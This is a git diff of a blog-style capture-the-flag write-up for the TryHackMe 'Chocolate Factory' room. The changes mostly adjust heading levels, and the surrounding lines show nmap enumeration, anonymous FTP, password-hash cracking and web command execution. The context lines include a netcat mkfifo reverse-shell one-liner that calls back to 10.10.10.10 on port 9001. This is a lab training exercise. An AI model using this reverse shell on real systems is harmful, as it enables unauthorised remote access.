@@ -13,13 +13,13 @@ img_path: /assets/img/tryhackme/chocolate
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [ChocolateFactory](https://tryhackme.com/room/chocolatefactory) from [TryHackMe](https://tryhackme.com).
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -165,7 +165,7 @@ ck, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie,
 
 There are a bunch of open ports, let's start with ftp.
 
-## FTP
+### FTP
 
 From our scan, we see that ftp allows anonymous login.
 
@@ -215,7 +215,7 @@ Wow, it's a shadow file that has the password hash of user `charlie`. Let's crac
 
 Got charlie's password but couldn't log in via ssh.
 
-## Web
+### Web
 
 Let's navigate to the web page.
 
@@ -228,7 +228,7 @@ Using the password we cracked, let's login as charlie
 We see that we can execute command of the target.
 
 
-# **Foothold**
+## **Foothold**
 
 With the command execution of the target, let's get a reverse shell.
 
@@ -246,7 +246,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
 
 We got a shell, and used python pty to stabilize it.
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 Let's do some basic enumeration.
 
@@ -285,5 +285,3 @@ The key can be found on http://{Target_ip}/key_rev_key, we run `strings` on the 
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
 
 ---
-
-# References
